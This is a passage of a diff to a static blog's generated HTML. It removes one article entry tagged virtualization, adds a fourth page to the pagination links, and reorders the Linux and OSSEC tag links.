-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/virtualization/" class="article-tag-list-link color5">virtualization</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/virtualization/Docker-SSH/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
     </nav>
   
 
@@ -1441,11 +1413,11 @@ var _hmt = _hmt || [];
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+                <a href="javascript:void(0)" class="js-tag color1">OSSEC</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">OSSEC</a>
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
